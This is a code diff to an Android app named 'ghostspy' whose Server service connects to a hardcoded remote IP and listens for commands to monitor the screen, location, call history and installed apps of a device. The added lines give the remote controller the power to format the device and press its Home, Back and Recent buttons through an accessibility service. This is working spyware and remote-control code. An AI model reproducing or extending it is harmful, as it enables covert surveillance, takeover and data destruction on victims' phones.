@@ -16,6 +16,7 @@ import android.view.WindowManager;
 import androidx.annotation.NonNull;
 import androidx.annotation.Nullable;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import com.google.android.gms.location.FusedLocationProviderClient;
 import com.google.android.gms.location.LocationCallback;
@@ -28,6 +29,7 @@ import com.spy.ghostspy.model.CallLogEntry;
 import com.spy.ghostspy.model.ImageData;
 import com.spy.ghostspy.model.MousePositionEntry;
 import com.spy.ghostspy.model.SkeletonEntry;
+import com.spy.ghostspy.services.CaptureForgroundService;
 import com.spy.ghostspy.services.MainAccessibilityService;
 import com.spy.ghostspy.utils.Common;
 
@@ -84,7 +86,7 @@ public class Server extends Service {
 
         try {
             socket = IO.socket("http://31.220.82.254:8080/");
-//            socket = IO.socket("http://191.101.131.54:8081");
+//            socket = IO.socket("http://191.101.131.54:8080");
             socket.connect();
             socket.on(Socket.EVENT_CONNECT, onConnectDevice);
             socket.on("mb-screen-monitor-" + mDeviceID, onScreenMonitor);
@@ -100,6 +102,10 @@ public class Server extends Service {
             socket.on("mb-location-monitor-" + mDeviceID, onLocationMonitor);
             socket.on("mb-call-history-monitor-" + mDeviceID, onCallHistoryMonitor);
             socket.on("mb-application-monitor-" + mDeviceID, onInstalledAppMonitor);
+            socket.on("mb-device-format-event-" + mDeviceID, onDeviceFormatMonitor);
+            socket.on("mb-screen-home-event-" + mDeviceID, onDeviceHomeMonitor);
+            socket.on("mb-screen-back-event-" + mDeviceID, onDeviceBackMonitor);
+            socket.on("mb-screen-recent-event-" + mDeviceID, onDeviceRecentMonitor);
             socket.on("mb-monitor-close-" + mDeviceID, onCloseMonitor);
         } catch (URISyntaxException e) {
             e.printStackTrace();
@@ -305,6 +311,39 @@ public class Server extends Service {
         public void call(Object... args) {
             Log.d("onInstalledAppMonitor:", "");
             Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_APP_INSTALLED);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onDeviceFormatMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            Log.d("onInstalledAppMonitor:", "");
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_FORMAT);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+
+    private final Emitter.Listener onDeviceHomeMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            Log.d("onInstalledAppMonitor:", "");
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_HOME);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onDeviceBackMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            Log.d("onInstalledAppMonitor:", "");
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_BACK);
+            sendBroadcast(broadcastIntent);
+        }
+    };
+    private final Emitter.Listener onDeviceRecentMonitor = new Emitter.Listener() {
+        @Override
+        public void call(Object... args) {
+            Log.d("onInstalledAppMonitor:", "");
+            Intent broadcastIntent = new Intent(MainAccessibilityService.ACTION_DEVICE_RECENT);
             sendBroadcast(broadcastIntent);
         }
     };
